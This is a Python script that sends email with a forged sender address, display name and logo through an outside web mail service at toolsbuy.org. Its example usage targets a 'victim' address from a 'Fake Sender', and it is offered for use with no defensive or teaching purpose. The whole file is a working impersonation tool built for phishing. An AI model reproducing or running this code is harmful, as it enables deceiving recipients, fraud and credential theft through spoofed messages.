import requests

def send_spoofed_email(api_url, sender, recipient, subject, message, sender_name=None, logo_url=None, cc=None, bcc=None):
    payload = {
        'from': sender,        # Spoofed sender email address
        'to': recipient,       # Recipient email address
        'subject': subject,    # Subject of the email
        'message': message     # Main content/body of the email
    }
    if sender_name:
        payload['sender_name'] = sender_name  # Optional: display name for sender
    if logo_url:
        payload['logo_url'] = logo_url        # Optional: logo/image URL
    if cc:
        payload['cc'] = cc                   # Optional: CC recipient(s), comma-separated
    if bcc:
        payload['bcc'] = bcc                 # Optional: BCC recipient(s), comma-separated

    try:
        response = requests.post(api_url, data=payload)
        if response.status_code == 200:
            print('Email sent successfully!')
            print('Response:', response.text)
        else:
            print(f'Failed to send email. Status Code: {response.status_code}')
            print('Response:', response.text)
    except Exception as e:
        print(f'An error occurred: {e}')

if __name__ == "__main__":
    # Example usage
    api_url = "http://toolsbuy.org/wmail"
    sender = "spoofed@example.com"
    recipient = "victim@example.com"
    subject = "Test Spoofed Email"
    message = "This is a test email sent using a spoofed address."
    sender_name = "Fake Sender"
    logo_url = "https://upload.wikimedia.org/wikipedia/commons/4/47/Logo_example.png"
    cc = "ccuser@example.com"
    bcc = "bccuser@example.com"

    send_spoofed_email(api_url, sender, recipient, subject, message, sender_name, logo_url, cc, bcc)
